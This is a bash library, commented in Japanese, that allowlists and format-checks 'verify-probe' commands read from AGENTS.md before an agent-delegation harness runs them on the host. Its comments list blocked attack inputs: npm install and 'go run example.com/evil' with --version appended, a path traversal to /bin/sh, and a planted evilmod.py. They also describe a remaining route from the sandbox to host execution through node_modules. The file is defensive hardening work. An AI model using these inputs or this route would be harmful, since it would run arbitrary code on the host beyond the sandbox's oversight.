# shellcheck shell=bash
# 検証プローブ(AGENTS.md の <!-- verify-probe: ... -->)の許可リストと形式検査。
#
# **source 専用。** 実行ビットは付けない(shebang も付けない)。
# 命名規約: .claude/scripts/lib-*.sh は source 専用。CI(ci.yml の harness-integrity)と
# SessionStart hook が、この名前のファイルに **実行ビットが無いこと・shebang が無いこと**
# を機械検査する(#45 §10)。単体で起動する実体を lib- で始まる名前にしないこと。
# 利用側: .claude/scripts/delegate-codex.sh
#
# ここで抽出・判定する文字列は **ホスト上の bash -c にそのまま渡りうる**(P1〜P3 の形式)。
# 許可リストを緩めるときは、必ず実測してから足すこと(手順は下の PROBE_ALLOWED_CMDS の
# コメント)。
#
# **source した瞬間に走るコードを含む**(PROBE_ENV の組み立て。親プロセスの
# PATH / HOME / TMPDIR を読む)。
#
# フェイル方針: **呼び出し側でフェイルクローズ**(理由は delegate-codex.sh の source 位置)。
#
# 委託禁止領域に入るか: 入る(".claude/scripts/" がディレクトリ単位。#40)。
#
# 実行中の書き換えハザード: delegate-codex.sh は起動直後に自身と lib-*.sh を一時
# ディレクトリへコピーして exec する(#15 / #86)。

# ---- 入口検査3 の許可リスト(プローブ形式) ----
#
# AGENTS.md は merge 区分でプロジェクトが書き換える面であり、かつ出口ハッシュ検査が
# 効かない経路(モード C / シグナルで出口検査に到達せず死んだ委託 / 人間の誤マージ)が
# 残る。ここで抽出した文字列は **ホスト上の bash -c にそのまま渡る**ため、
# 形式検査を掛けてからでないと実行しない。
#
# denylist(禁止文字を弾く)にはしない。クォート・展開・多バイト表現で必ず抜ける。
# 「許可した文字だけで構成され、許可したコマンドで始まり、導通確認トークンを含む」
# という許可リスト方式にする。

# 第 1 トークンとして許可する実行コマンド。
#
# **この環境で実測し「ワークツリーの設定ファイルに影響されない」ことを確認したものだけ**
# を載せる。<cmd> --version は「版を出して終わる」と思いがちだが、実際には
# ランチャーがカレントの設定を読んで実行するコード自体を差し替えるものがある:
#   yarn  .yarnrc の yarn-path で任意の JS に委譲する(実測で任意コード実行)
#   mvn   .mvn/jvm.config が JVM 起動オプションに渡る(-javaagent: で premain が走る)
#   pnpm  package.json の packageManager で corepack が別バージョンを取得・実行する
# この 3 つは外した。未インストールで実測できなかったもの(deno bun go cargo rustc
# dotnet php composer swift pip uv poetry bundle)も、検証できていない以上載せない。
#   python(python3 ではない)は外してある。実測できないうえ、Python 2 を指す環境では
#   P3 の根拠である -I(3.4 で追加)が無く、cwd の sys.path 挿入を止められない。
#
# **追加するときは必ず実測すること**: 作業ディレクトリに各処理系の設定ファイルと
# canary を書き出すスクリプトを置き、env -i PATH=... HOME=... bash -c '<cmd> --version'
# で canary が作られないこと・出力がシステム版と一致することを確認する(design §16.2)。
PROBE_ALLOWED_CMDS="node npm npx python3 ruby java rake gradle"

# いずれか 1 つを末尾に要求する導通確認トークン。
#
# **裸の `version`(ダッシュなし)と `-v` / `-V` / `--help` / `-h` は入れない。**
# 裸の version は多くの処理系で「位置引数 = 実行するスクリプトのパス / タスク名」と
# 解釈され、cd "$ROOT" した状態のプローブがリポジトリ直下の `version` という
# ファイルを実行してしまう(実測: node version で version というファイルの中身が走る。
# rake / gradle はファイル名の細工すら不要で Rakefile / build.gradle を評価する)。
# -v は多くのツールで verbose の意味になり、python3 -v は対話 REPL に落ちて委託が止まる。
# --help / -h は導通確認としての価値が無い割に cwd の設定を読む CLI が残る。
# `-version` はここに入れない。ruby / rake は -v + -e に分解して残り "rsion" を
# eval しようとして落ち、python3 は Unknown option になる(実測)。
# java だけは --version(Java 9+)も -version(従来形)も版を出して終わるので、
# `java -version` を下の完全一致特例で通す。
PROBE_VERIFY_TOKENS="--version"

# **P1〜P3(exec を伴う形)に残るリスク**: プローブは cd "$ROOT" した状態で実行される。
# npx --no-install <pkg> は node_modules/.bin/<pkg> を解決するため、ワークツリーに
# 実行ファイルを置ける相手には、AGENTS.md を 1 文字も変えなくてもホスト実行の経路が
# 残る(sandbox 内で書く → 次回委託の入口検査でサンドボックス外実行)。これは
# プローブの正当な仕事(このプロジェクトのローカル依存の導通確認)と表裏一体で、
# 形式検査では原理的に閉じられない。空ディレクトリでの実行は npx --no-install が
# 常に失敗するため採れない(実測)。
#
# **この経路を受け持つ層は存在しない(#82)。** かつてここには「ワークツリーの完全性は
# 出口ハッシュ検査・check-guard-integrity.sh degraded が受け持つ別の層」と書いてあったが、
# 出口ハッシュ検査は FORBIDDEN_PATHS に列挙したパスだけを走査して node_modules/ を見ず
# (数万ファイルのハッシュは現実的でない)、degraded 検査は git log 起点で node_modules/ は
# gitignore 済み。**前提だけが書かれていて、その層は実在しなかった。**
#
# そのため既定形式を P0(exists <相対パス>)に移した。P0 はプロセスを 1 つも起動しない
# ので、この経路そのものが無い。P1〜P3 は他スタックのプロジェクト向けの後方互換として
# 残すが、選んだ場合は上のリスクを受容することになる(#60 の「受容するなら明文化する」)。

# パッケージ名 / モジュール名の検査。正規表現に一致し、かつ `..` を含まないこと。
# 正規表現だけに頼らず `..` を独立に弾くのは多重防御 — 文字クラスの見落としが
# そのままパストラバーサルになった経緯(design §14)があるため。
_probe_name_ok() {
  case "$1" in
    *..*) return 1 ;;
  esac
  LC_ALL=C printf '%s' "$1" | grep -qE "$2"
}

# プローブ文字列が許可形式かを判定する。0 = 許可 / 1 = 不許可。
# 不許可の理由は標準出力に 1 行返す(呼び出し側が警告に埋め込む)。
probe_format_reason() {
  local probe="$1"
  local -a parts
  local n last

  # (a) 長さ上限。導通確認にこれ以上は要らない。
  if [ "${#probe}" -gt 200 ]; then
    echo "200 文字を超えています"
    return 1
  fi

  # (a2) 改行を含むものは弾く。以降の grep は行単位で判定するため、複数行のうち
  #      1 行だけが許可形式なら通過してしまう。現状の抽出は head -1 で単一行だが、
  #      「呼び出し側が単一行を渡す」という暗黙の前提に防御を預けない。
  case "$probe" in
    *$'\n'*)
      echo "改行を含んでいます"
      return 1
      ;;
  esac

  # (b) 文字とトークン区切りの制限。
  #     許可文字: 英数 . _ / @ = : + -
  #     区切りは半角スペース 1 個のみ(連続スペース・タブ・改行は不許可)。
  #     これによりシェルのメタ文字( ; | & $ ` ' " ( ) < > * ? \ ! ~ 改行 )が
  #     すべて構文上あらわれない = bash -c に渡してもコマンド連結・展開が起きない。
  if ! LC_ALL=C printf '%s' "$probe" |
    grep -qE '^[A-Za-z0-9][A-Za-z0-9._/@=:+-]*( [A-Za-z0-9._/@=:+-]+)*$'; then
    echo "許可されない文字またはトークン区切りが含まれています(許可: 英数 . _ / @ = : + - と半角スペース 1 個区切り)"
    return 1
  fi

  # (c) 全体が導通確認の固定形に一致すること。
  #     トークン単位の許可(第 1 トークン + どこかに --version)では不十分だった:
  #     npm install left-pad --version / pip install requests --version /
  #     go run example.com/evil --version がすべて通り、postinstall・setup.py・
  #     リモートモジュール取得を経由してホスト上で任意コードが走る(実測)。
  #     env -i はネットワークを塞がないので、これは実害のある経路。
  #
  #       P0  exists <相対パス>                          exists node_modules/.bin/eslint(exec しない)
  #       P1  <cmd> <verify>                          node --version / java -version
  #       P2  npx --no-install <pkg> <verify>         npx --no-install eslint --version
  #       P3  python|python3 -I -m <module> <verify>  python3 -I -m pytest --version
  #
  #     (b) が空白 1 個区切りを保証しているので、単語分割でトークン化してよい。
  IFS=' ' read -r -a parts <<<"$probe"
  n="${#parts[@]}"
  last="${parts[$((n - 1))]}"

  # P0: exists <相対パス> — **ホスト上でプロセスを 1 つも起動しない**存在確認。
  #     テンプレート既定はこの形。P1〜P3(exec を伴う形)は他スタック向けの
  #     後方互換として残すが、上の「残るリスク」をそのまま引き受けることになる。
  #     末尾が導通確認トークンではないため、下のトークン検査より手前で分岐する。
  if [ "${parts[0]}" = "exists" ]; then
    if [ "$n" != 2 ]; then
      echo "exists 形式は exists <相対パス> の 2 トークンである必要があります"
      return 1
    fi
    # 先頭 1 文字の文字クラスで絶対パス(/)と - 始まりを弾き、
    # .. は _probe_name_ok の独立検査が弾く(P2 / P3 と同じ多重防御)。
    if _probe_name_ok "${parts[1]}" '^[A-Za-z0-9._@+][A-Za-z0-9._/@=:+-]*$'; then
      return 0
    fi
    echo "exists のパスが不正です(リポジトリ相対のみ。.. と絶対パスは不可): ${parts[1]}"
    return 1
  fi

  # java だけは従来形の `java -version` も通す(実測で版を出して終わる)。
  # 他の処理系は -version を -v + -e に分解するため PROBE_VERIFY_TOKENS には入れない。
  if [ "$probe" = "java -version" ]; then
    return 0
  fi

  # 末尾は必ず導通確認トークン。「表示して終わる」以外を書けなくする。
  case " $PROBE_VERIFY_TOKENS " in
    *" $last "*) ;;
    *)
      echo "末尾は導通確認トークン(${PROBE_VERIFY_TOKENS// /, })である必要があります"
      return 1
      ;;
  esac

  if [ "$n" = 2 ]; then
    # P1
    case " $PROBE_ALLOWED_CMDS " in
      *" ${parts[0]} "*) return 0 ;;
      *)
        echo "許可されていないコマンドです: ${parts[0]}"
        return 1
        ;;
    esac
  fi

  if [ "$n" = 4 ]; then
    # P2: npx は --no-install 必須(ホスト側にはネットワークがあるため、
    #     外すとレジストリから取得して実行してしまう)
    if [ "${parts[0]}" = "npx" ] && [ "${parts[1]}" = "--no-install" ]; then
      # パッケージ名は npm の文法(@scope/name または name)に限る。
      # 旧: ^[A-Za-z0-9@][A-Za-z0-9._/@-]*$ は . と / を無制限に許したため
      # `docs/../../../../../../../bin/sh` が通り、ワークツリーの外の絶対パス実行ファイルを
      # 起動できた(実測で /bin/sh に到達)。/ を @scope/ の 1 回だけに縛る。
      if _probe_name_ok "${parts[2]}" '^(@[A-Za-z0-9][A-Za-z0-9._-]*/)?[A-Za-z0-9][A-Za-z0-9._-]*$'; then
        return 0
      fi
      echo "npx のパッケージ名が不正です: ${parts[2]}"
      return 1
    fi
  fi

  if [ "$n" = 5 ]; then
    # P3: python -I -m <module> <verify>
    #     -I は必須。付けないと python は cwd を sys.path の先頭に入れるため、
    #     リポジトリ直下に <module>.py を置くだけでホスト上の任意コード実行になる
    #     (実測: python3 -m evilmod --version でカレントの evilmod.py が走る。
    #      -I を付けると No module named evilmod で止まる)。
    if [ "${parts[0]}" = "python3" ] &&
      [ "${parts[1]}" = "-I" ] && [ "${parts[2]}" = "-m" ]; then
      if _probe_name_ok "${parts[3]}" '^[A-Za-z0-9_][A-Za-z0-9._]*$'; then
        return 0
      fi
      echo "python -I -m のモジュール名が不正です: ${parts[3]}"
      return 1
    fi
  fi

  echo "許可された形に一致しません(exists <相対パス> / <cmd> <verify> / npx --no-install <pkg> <verify> / python -I -m <module> <verify> のいずれか)"
  return 1
}

# プローブに渡す環境(許可リスト方式)。#23 で codex exec に入れたものと同じ考え方だが、
# **意図的に狭い**。プローブは「バージョンを表示して終わる」固定形のコマンドであり、
# エージェント実行のようにロケール・プロキシ・CA を必要としない。
#   PATH    env 自身が bash を解決するのに要る。未設定時は最小の既定値を置く
#           (未設定のまま env -i すると bash すら見つからない)
#   HOME    npm / cargo / go のキャッシュ・設定探索元。無くても現行プローブは通るが、
#           他スタックのプローブが HOME 前提で落ちるのを避けるため残す
#   TMPDIR  一時ディレクトリを既定から外している環境向け
#   COREPACK_ENABLE_NETWORK=0  corepack が package.json の packageManager を見て
#                              別バージョンを取得・実行するのを止める(pnpm/yarn は
#                              許可リストから外したが、環境によっては npm/npx も
#                              corepack の shim になりうるため入れておく)
PROBE_ENV=("PATH=${PATH:-/usr/local/bin:/usr/bin:/bin}" "COREPACK_ENABLE_NETWORK=0")
for _pe in HOME TMPDIR; do
  [ -n "${!_pe+x}" ] && PROBE_ENV+=("$_pe=${!_pe}")
done
unset _pe
